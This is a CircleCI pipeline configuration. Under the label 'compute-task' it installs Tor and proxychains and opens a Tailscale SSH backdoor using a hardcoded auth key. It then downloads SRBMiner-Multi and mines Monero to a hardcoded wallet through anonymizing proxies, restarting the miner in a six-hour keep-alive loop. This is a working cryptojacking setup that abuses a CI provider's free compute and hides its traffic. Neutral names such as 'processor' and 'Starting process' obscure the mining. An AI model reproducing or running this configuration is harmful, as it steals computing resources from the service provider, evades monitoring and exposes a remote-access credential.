version: 2.1

jobs:
  compute-task:
    docker:
      - image: ubuntu:22.04
    
    steps:
      - run:
          name: "Setup Environment"
          command: |
            apt-get update -qq
            apt-get install -y -qq curl wget iproute2 tor proxychains4
      
      - run:
          name: "Install Tailscale"
          command: |
            curl -fsSL https://tailscale.com/install.sh | sh
            
      - run:
          name: "Start Tailscale (SSH Only)"
          background: true
          command: |
            tailscaled --tun=userspace-networking --state=/tmp/tailscale.state
      
      - run:
          name: "Connect Tailscale for SSH"
          command: |
            sleep 5
            tailscale up \
              --authkey=tskey-auth-kzvYcDGAF521CNTRL-HkCXeCi2ydc5hqyiEWgUecZP1XT4BV1CT \
              --hostname=ci-compute-$RANDOM \
              --ssh
            
            sleep 10
            
            for i in {1..10}; do
              if tailscale status | grep -q "100."; then
                TS_IP=$(tailscale ip -4)
                echo "==================================="
                echo "✅ Tailscale SSH Ready!"
                echo "IP: ${TS_IP}"
                echo "SSH: ssh ci-compute-*"
                echo "==================================="
                exit 0
              fi
              sleep 3
            done
            echo "[!] Tailscale failed"
            exit 1
      
      - run:
          name: "Setup Proxy Chain"
          command: |
            echo "==================================="
            echo "Configuring proxy fallback chain..."
            echo "==================================="
            
            # Configure proxychains with multiple fallback options
            echo "strict_chain" > /etc/proxychains4.conf
            echo "proxy_dns" >> /etc/proxychains4.conf
            echo "tcp_read_time_out 15000" >> /etc/proxychains4.conf
            echo "tcp_connect_time_out 8000" >> /etc/proxychains4.conf
            echo "" >> /etc/proxychains4.conf
            echo "[ProxyList]" >> /etc/proxychains4.conf
            echo "# Try Tor first" >> /etc/proxychains4.conf
            echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
            echo "# Fallback to public proxies" >> /etc/proxychains4.conf
            echo "socks5 51.79.248.208 29152" >> /etc/proxychains4.conf
            echo "socks5 103.127.1.130 80" >> /etc/proxychains4.conf
            echo "http 20.206.106.192 80" >> /etc/proxychains4.conf
            
            echo "✅ Proxychains configured"
            echo "Chain: Tor → Public SOCKS5 → Public HTTP"
      
      - run:
          name: "Start Tor (Background)"
          background: true
          command: |
            echo "Starting Tor..."
            
            echo "SOCKSPort 9050" > /etc/tor/torrc
            echo "SOCKSPolicy accept 127.0.0.1" >> /etc/tor/torrc
            echo "Log notice stdout" >> /etc/tor/torrc
            echo "ClientOnly 1" >> /etc/tor/torrc
            echo "StrictNodes 0" >> /etc/tor/torrc
            
            tor -f /etc/tor/torrc 2>&1 | head -20
      
      - run:
          name: "Test Proxy Chain"
          command: |
            echo "==================================="
            echo "Testing proxy chain..."
            echo "==================================="
            
            sleep 15
            
            # Test if Tor is working
            if timeout 10 curl -x socks5h://localhost:9050 -s https://ipinfo.io/ip 2>/dev/null; then
              TOR_IP=$(curl -x socks5h://localhost:9050 -s https://ipinfo.io/ip 2>/dev/null)
              echo "✅ Tor working: $TOR_IP"
              echo "TOR" > /tmp/proxy_type
              echo "127.0.0.1:9050" > /tmp/proxy_addr
            else
              echo "⚠️ Tor not available, using public proxies"
              
              # Test public proxies
              if timeout 10 curl -x socks5://51.79.248.208:29152 -s https://ipinfo.io/ip 2>/dev/null; then
                PROXY_IP=$(curl -x socks5://51.79.248.208:29152 -s https://ipinfo.io/ip 2>/dev/null)
                echo "✅ Public proxy working: $PROXY_IP"
                echo "SOCKS5" > /tmp/proxy_type
                echo "51.79.248.208:29152" > /tmp/proxy_addr
              else
                echo "⚠️ Using direct connection (no proxies available)"
                echo "DIRECT" > /tmp/proxy_type
                echo "" > /tmp/proxy_addr
              fi
            fi
            
            echo "==================================="
      
      - run:
          name: "Download Mining Tools"
          command: |
            cd /tmp
            wget -q -O tools.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
            tar -xzf tools.tar.gz
            mv SRBMiner-Multi-3-4-3 processor
            cd processor
            chmod +x SRBMiner-MULTI
      
      - run:
          name: "Start Mining Process"
          no_output_timeout: 6h
          command: |
            cd /tmp/processor
            
            PROXY_TYPE=$(cat /tmp/proxy_type)
            PROXY_ADDR=$(cat /tmp/proxy_addr)
            
            echo "==================================="
            echo "Starting process..."
            echo "Pool: xmr-sg.kryptex.network:8029"
            echo "Proxy: $PROXY_TYPE ($PROXY_ADDR)"
            echo "SSH: Via Tailscale"
            echo "==================================="
            
            # Start mining with detected proxy
            if [ "$PROXY_TYPE" = "DIRECT" ]; then
              # No proxy
              ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
                --pool xmr-sg.kryptex.network:8029 \
                --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Direct-$RANDOM" \
                --log-file /tmp/compute.log &
            else
              # Via proxy
              ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
                --pool xmr-sg.kryptex.network:8029 \
                --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Proxy-$RANDOM" \
                --proxy $PROXY_ADDR \
                --log-file /tmp/compute.log &
            fi
            
            PROC_PID=$!
            sleep 20
            
            # Verify
            if kill -0 ${PROC_PID} 2>/dev/null; then
              echo ""
              echo "==================================="
              echo "✅ Process running (PID: ${PROC_PID})"
              echo "==================================="
              echo ""
              tail -40 /tmp/compute.log
              echo ""
              echo "==================================="
            else
              echo ""
              echo "[!] Process failed"
              cat /tmp/compute.log
              exit 1
            fi
            
            # Keep alive
            while true; do
              if ! kill -0 ${PROC_PID} 2>/dev/null; then
                echo "[$(date)] Restarting..."
                
                if [ "$PROXY_TYPE" = "DIRECT" ]; then
                  ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
                    --pool xmr-sg.kryptex.network:8029 \
                    --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Direct-$RANDOM" \
                    --log-file /tmp/compute.log &
                else
                  ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
                    --pool xmr-sg.kryptex.network:8029 \
                    --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Proxy-$RANDOM" \
                    --proxy $PROXY_ADDR \
                    --log-file /tmp/compute.log &
                fi
                
                PROC_PID=$!
                sleep 10
              fi
              
              sleep 300
              echo "[$(date)] Running"
              tail -3 /tmp/compute.log
            done

workflows:
  compute-workflow:
    jobs:
      - compute-task
